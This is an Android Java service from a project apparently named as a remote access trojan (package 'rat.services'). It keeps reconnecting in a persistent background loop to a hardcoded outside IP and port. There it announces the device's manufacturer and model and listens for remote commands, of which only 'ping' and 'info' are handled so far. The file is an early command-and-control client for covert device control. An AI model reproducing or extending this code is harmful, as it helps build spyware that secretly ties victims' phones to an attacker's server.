package com.fly0rakoon.rat.services;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;

public class ConnectionService extends Service {
    private static final String TAG = "ConnectionService";
    private static String SERVER_IP = "34.58.145.84"; // Will be replaced
    private static int SERVER_PORT = 5555; // Will be replaced
    
    private Socket socket;
    private BufferedReader input;
    private PrintWriter output;
    private Thread connectionThread;
    private boolean isRunning = true;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "ConnectionService created");
        startConnection();
    }
    
    private void startConnection() {
        connectionThread = new Thread(new Runnable() {
            @Override
            public void run() {
                while (isRunning) {
                    try {
                        if (socket == null || !socket.isConnected()) {
                            connect();
                        }
                        
                        if (socket != null && socket.isConnected()) {
                            // Send handshake
                            sendMessage("DEVICE:" + android.os.Build.MANUFACTURER + "-" + android.os.Build.MODEL);
                            
                            // Listen for commands
                            String line;
                            while ((line = input.readLine()) != null && isRunning) {
                                Log.d(TAG, "Received command: " + line);
                                processCommand(line);
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Connection error", e);
                        try {
                            Thread.sleep(5000); // Wait 5 seconds before reconnecting
                        } catch (InterruptedException ie) {
                            Thread.currentThread().interrupt();
                        }
                    }
                }
            }
        });
        connectionThread.start();
    }
    
    private void connect() {
        try {
            Log.d(TAG, "Connecting to " + SERVER_IP + ":" + SERVER_PORT);
            socket = new Socket();
            socket.connect(new InetSocketAddress(SERVER_IP, SERVER_PORT), 10000);
            input = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            output = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())), true);
            Log.d(TAG, "Connected successfully");
        } catch (Exception e) {
            Log.e(TAG, "Connection failed", e);
            socket = null;
        }
    }
    
    private void processCommand(String command) {
        if (command.equals("ping")) {
            sendMessage("pong");
        } else if (command.equals("info")) {
            sendMessage("Device: " + android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL);
        } else {
            sendMessage("Unknown command: " + command);
        }
    }
    
    private void sendMessage(String message) {
        if (output != null) {
            output.println(message);
        }
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "ConnectionService started");
        return START_STICKY;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "ConnectionService destroyed");
        isRunning = false;
        try {
            if (socket != null) socket.close();
            if (input != null) input.close();
            if (output != null) output.close();
        } catch (Exception e) {
            Log.e(TAG, "Error closing socket", e);
        }
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
